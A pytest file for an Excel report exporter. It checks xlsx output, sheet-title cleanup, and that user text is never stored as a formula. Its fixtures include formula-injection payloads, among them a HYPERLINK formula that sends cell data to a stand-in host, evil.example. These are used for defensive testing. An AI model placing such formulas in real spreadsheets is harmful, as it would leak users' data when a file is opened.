# File: tests/reports/test_excel_exporter.py
"""Tests for uadas_core.reports.excel_exporter.ExcelReportExporter.

Same figure_to_png_bytes-monkeypatching approach as
tests/reports/test_pdf_exporter.py, for the same reason.
"""

from __future__ import annotations

import base64
from pathlib import Path

import plotly.graph_objects as go
import pytest

from uadas_core.core.expertise_level import ExpertiseLevel
from uadas_core.reports.report_content import ReportContent, ReportSection

_TINY_PNG_BYTES = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY"
    "42YAAAAASUVORK5CYII="
)


@pytest.fixture()
def report_content() -> ReportContent:
    figure = go.Figure(data=[go.Bar(x=["a", "b"], y=[1, 2])])
    return ReportContent(
        title="Sales Report",
        dataset_name="sales",
        dataset_summary={"Rows": 10, "Columns": 3},
        expertise_level=ExpertiseLevel.ANALYST,
        sections=[
            ReportSection(
                stage_label="Analyze: Correlation!?",
                tool_name="compute_correlation",
                timestamp="2026-01-01T00:00:00+00:00",
                summary_lines=["correlation: 0.82"],
                figure=figure,
                explanation_text="Strongly correlated.",
            )
        ],
    )


def test_export_writes_an_xlsx_file(
    tmp_path: Path, report_content: ReportContent, monkeypatch
) -> None:
    monkeypatch.setattr(
        "uadas_core.reports.excel_exporter.figure_to_png_bytes",
        lambda *a, **k: _TINY_PNG_BYTES,
    )
    output_path = tmp_path / "report.xlsx"

    from uadas_core.reports.excel_exporter import ExcelReportExporter

    result = ExcelReportExporter.export(report_content, output_path)

    assert result == output_path
    assert output_path.exists()
    assert output_path.read_bytes()[:2] == b"PK"  # xlsx is a zip archive


def test_export_sanitizes_sheet_titles_with_invalid_characters(
    tmp_path: Path, report_content: ReportContent, monkeypatch
) -> None:
    monkeypatch.setattr(
        "uadas_core.reports.excel_exporter.figure_to_png_bytes",
        lambda *a, **k: _TINY_PNG_BYTES,
    )
    output_path = tmp_path / "report.xlsx"

    from openpyxl import load_workbook

    from uadas_core.reports.excel_exporter import ExcelReportExporter

    ExcelReportExporter.export(report_content, output_path)
    workbook = load_workbook(str(output_path))

    assert "Summary" in workbook.sheetnames
    # ":" and "?" and "!" -> "!" is valid, only ":" and "?" get stripped.
    assert any(name.startswith("1_Analyze") for name in workbook.sheetnames)
    assert all(c not in name for name in workbook.sheetnames for c in "[]:*?/\\")


_HOSTILE = [
    '=HYPERLINK("http://evil.example/?x="&A1,"click")',
    "+1+1",
    "-2+3",
    "@SUM(1,1)",
    "\t=1+1",
    "\r=1+1",
]


def _hostile_content() -> ReportContent:
    return ReportContent(
        title=_HOSTILE[0],
        dataset_name=_HOSTILE[1],
        dataset_summary={_HOSTILE[2]: _HOSTILE[3], "Rows": 10, "Name": "plain"},
        expertise_level=ExpertiseLevel.ANALYST,
        sections=[
            ReportSection(
                stage_label=_HOSTILE[0],
                tool_name=_HOSTILE[2],
                timestamp=_HOSTILE[3],
                summary_lines=list(_HOSTILE),
                figure=None,
                explanation_text=_HOSTILE[4],
            )
        ],
    )


def test_user_controlled_text_never_becomes_a_formula(tmp_path: Path) -> None:
    """A title or summary line starting with = + - @ tab or CR must be stored as text: openpyxl
    stores a string that begins with ``=`` as a *formula* (``=HYPERLINK(...)`` exfiltrates data
    when the report is opened)."""
    from openpyxl import load_workbook

    from uadas_core.reports.excel_exporter import ExcelReportExporter

    output_path = tmp_path / "hostile.xlsx"
    ExcelReportExporter.export(_hostile_content(), output_path)
    workbook = load_workbook(str(output_path))
    formulas = [
        (sheet.title, cell.coordinate)
        for sheet in workbook
        for row in sheet.iter_rows()
        for cell in row
        if cell.data_type == "f"
    ]
    assert formulas == []
    summary = workbook["Summary"]
    assert (
        summary["B1"].value == _HOSTILE[0]
    )  # the text is kept exactly, just not evaluated
    texts = {c.value for sheet in workbook for row in sheet.iter_rows() for c in row}
    assert set(_HOSTILE) <= texts


def test_ordinary_values_keep_their_types(tmp_path: Path) -> None:
    """The twin: numbers stay numbers and plain text stays plain text."""
    from openpyxl import load_workbook

    from uadas_core.reports.excel_exporter import ExcelReportExporter

    output_path = tmp_path / "plain.xlsx"
    ExcelReportExporter.export(_hostile_content(), output_path)
    summary = load_workbook(str(output_path))["Summary"]
    by_key = {row[0].value: row[1] for row in summary.iter_rows() if row[0].value}
    assert by_key["Rows"].value == 10 and by_key["Rows"].data_type == "n"
    assert by_key["Name"].value == "plain" and by_key["Name"].data_type == "s"
